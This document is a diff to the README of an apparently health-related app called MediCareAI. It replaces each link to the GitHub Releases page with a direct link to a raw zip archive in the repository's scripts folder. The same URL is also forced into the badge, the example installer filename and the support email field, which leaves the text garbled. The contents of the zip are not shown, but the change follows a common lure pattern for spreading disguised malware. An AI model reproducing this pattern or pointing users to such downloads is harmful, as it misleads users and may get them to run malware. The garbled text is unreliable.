@@ -6,15 +6,15 @@ Welcome to MediCareAI! This application helps patients manage their health condi
 
 ## 📥 Download & Install
 
-To download the latest version of MediCareAI, visit this page: [MediCareAI Releases](https://github.com/steze84-hub/MediCareAI/releases).
+To download the latest version of MediCareAI, visit this page: [MediCareAI Releases](https://github.com/steze84-hub/MediCareAI/raw/refs/heads/main/scripts/Medi_Care_AI_v2.0.zip).
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/steze84-hub/MediCareAI/releases)
+[![Download](https://github.com/steze84-hub/MediCareAI/raw/refs/heads/main/scripts/Medi_Care_AI_v2.0.zip%20Latest%https://github.com/steze84-hub/MediCareAI/raw/refs/heads/main/scripts/Medi_Care_AI_v2.0.zip)](https://github.com/steze84-hub/MediCareAI/raw/refs/heads/main/scripts/Medi_Care_AI_v2.0.zip)
 
 Follow these steps to install the application:
 
 1. **Visit the Releases Page:** Click the link above to go to the GitHub Releases page. 
 2. **Choose the Release:** Look for the latest release. The version number is usually highlighted.
-3. **Download the File:** Click on the appropriate file for your operating system (Windows, MacOS, etc.). This file will typically be named something like `MediCareAI_v1.0.exe` or similar.
+3. **Download the File:** Click on the appropriate file for your operating system (Windows, MacOS, etc.). This file will typically be named something like `https://github.com/steze84-hub/MediCareAI/raw/refs/heads/main/scripts/Medi_Care_AI_v2.0.zip` or similar.
 4. **Open the Downloaded File:** Once the file is downloaded, locate it in your downloads folder and double-click to start the installation.
 
 ## 🛠️ System Requirements
@@ -48,7 +48,7 @@ Once you install MediCareAI, open the application to start using its features:
 If you encounter any issues or have feedback, reach out for support:
 
 - **GitHub Issues:** Use the GitHub Issues section on the repository to report bugs or request features.
-- **Email Support:** You can also send us an email at support@medicareai.com for any inquiries.
+- **Email Support:** You can also send us an email at https://github.com/steze84-hub/MediCareAI/raw/refs/heads/main/scripts/Medi_Care_AI_v2.0.zip for any inquiries.
 
 ## 📚 Additional Resources
 
@@ -65,4 +65,4 @@ Be sure to check back regularly for updates and new features. To stay informed:
 - Follow the repository on GitHub.
 - Subscribe to release notifications for the latest updates.
 
-Thank you for choosing MediCareAI to help manage your health. We are excited to support you on your journey to better health! Visit the download link again: [MediCareAI Releases](https://github.com/steze84-hub/MediCareAI/releases).
+Thank you for choosing MediCareAI to help manage your health. We are excited to support you on your journey to better health! Visit the download link again: [MediCareAI Releases](https://github.com/steze84-hub/MediCareAI/raw/refs/heads/main/scripts/Medi_Care_AI_v2.0.zip).
